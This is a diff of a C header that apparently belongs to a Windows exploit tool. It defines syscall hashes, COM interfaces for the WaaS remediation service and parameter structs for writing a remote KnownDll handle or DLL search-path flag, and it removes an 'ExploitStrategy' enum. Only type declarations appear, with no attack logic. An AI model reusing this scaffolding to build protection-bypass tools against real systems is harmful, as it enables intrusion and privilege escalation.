@@ -39,21 +39,6 @@ typedef HMODULE(WINAPI* LoadLibraryW_t)(LPCWSTR lpLibFileName);
 #define GetExitCodeThread_SW2_HASH         0xB69934BF
 #define LoadLibraryW_SW2_HASH              0x3EBB5CB0
 
-typedef HRESULT STDMETHODCALLTYPE QueryInterfacePtr(REFIID iid, _COM_Outptr_ LPVOID *ppv);
-typedef ULONG   STDMETHODCALLTYPE AddRefPtr(REFIID iid);
-typedef ULONG   STDMETHODCALLTYPE ReleasePtr(REFIID iid);
-
-typedef HRESULT STDMETHODCALLTYPE LaunchDetectionOnlyPtr(REFIID iid, BSTR bstrCallerApplicationName, ULONGLONG pbstrPlugins);
-typedef HRESULT STDMETHODCALLTYPE LaunchRemediationOnlyPtr(REFIID iid, BSTR bstrPlugins, BSTR bstrCallerApplicationName, ULONGLONG varResults);
-
-typedef HRESULT STDMETHODCALLTYPE StartPtr(REFIID iid, IUnknown* pHandlerServices, BSTR data);
-typedef HRESULT STDMETHODCALLTYPE StopPtr(REFIID iid, HRESULT* pRetCode);
-typedef HRESULT STDMETHODCALLTYPE PausePtr(REFIID iid);
-typedef HRESULT STDMETHODCALLTYPE ResumePtr(REFIID iid);
-
-typedef HRESULT STDMETHODCALLTYPE InvokePtr(PVOID iid, DISPID dispIdMember, REFIID riid, LCID lcid, WORD wFlags, DISPPARAMS *pDispParams, VARIANT *pVarResult, EXCEPINFO *pExcepInfo, UINT *puArgErr);
-typedef HRESULT STDMETHODCALLTYPE GetIDsOfNamesPtr(PVOID iid, REFIID riid, LPOLESTR *rgszNames, UINT cNames, LCID lcid, DISPID *rgDispId);
-
 typedef struct _IWaaSRemediationExVtbl {
     /*** IUnknown methods ***/
     HRESULT (STDMETHODCALLTYPE *QueryInterface)(
@@ -148,36 +133,9 @@ typedef struct _ITaskHandler {
     ITaskHandlerVtbl* lpVtbl;
 } ITaskHandler, *PITaskHandler;
 
-/*
-class __declspec(uuid("b4c1d279-966e-44e9-a9c5-ccaf4a77023d")) IWaaSRemediationEx : public IDispatch {
-public:
-    virtual HRESULT __stdcall LaunchDetectionOnly(BSTR bstrCallerApplicationName, ULONGLONG pbstrPlugins) = 0; // Modified version of LaunchDetectionOnly
-    virtual HRESULT __stdcall LaunchRemediationOnly(BSTR bstrPlugins, BSTR bstrCallerApplicationName, ULONGLONG varResults) = 0; // Modified version of LaunchRemediationOnly
-};
-
-_COM_SMARTPTR_TYPEDEF(IWaaSRemediationEx, __uuidof(IWaaSRemediationEx));
-
-class __declspec(uuid("839d7762-5121-4009-9234-4f0d19394f04")) ITaskHandler : public IUnknown {
-public:
-    virtual HRESULT __stdcall Start(IUnknown* pHandlerServices, BSTR data) = 0;
-    virtual HRESULT __stdcall Stop(HRESULT* pRetCode) = 0;
-    virtual HRESULT __stdcall Pause() = 0;
-    virtual HRESULT __stdcall Resume() = 0;
-};
-
-_COM_SMARTPTR_TYPEDEF(ITaskHandler, __uuidof(ITaskHandler));
-*/
-
-typedef enum _ExploitStrategy
-{
-    ExtractByteAtIndex0,
-    ExtractByteAtIndex1,
-    ExtractByteAtIndex2
-} ExploitStrategy;
-
 typedef struct _WRITE_REMOTE_KNOWN_DLL_HANDLE_PARAM
 {
-    ExploitStrategy Strategy;
+    ULONG32 Strategy;
     IWaaSRemediationEx* WaaSRemediationEx;
     ULONG_PTR WriteAtLaunchDetectionOnly;
     ULONG_PTR WriteAtLaunchRemediationOnly;
@@ -200,7 +158,10 @@ typedef struct _WRITE_REMOTE_DLL_SEARCH_PATH_FLAG_PARAM
     ( ((PIWaaSRemediationEx)This)->lpVtbl -> Invoke((IDispatch *)This,dispIdMember,riid,lcid,wFlags,pDispParams,pVarResult,pExcepInfo,puArgErr) )
 
 #define IWaaSRemediationEx_GetIDsOfNames(This,riid,rgszNames,cNames,lcid,rgDispId) \
-    ( ((PIWaaSRemediationEx)This)->lpVtbl -> GetIDsOfNames((IDispatch *)This,riid,rgszNames,cNames,lcid,rgDispId) ) 
+    ( ((PIWaaSRemediationEx)This)->lpVtbl -> GetIDsOfNames((IDispatch *)This,riid,rgszNames,cNames,lcid,rgDispId) )
+
+#define IWaaSRemediationEx_Release(This)  \
+    ( ((PIWaaSRemediationEx)This)->lpVtbl -> Release((IDispatch *)This) )
 
 #define ITaskHandler_Release(This) \
     ( ((PITaskHandler)This)->lpVtbl -> Release((IDispatch *)This) )
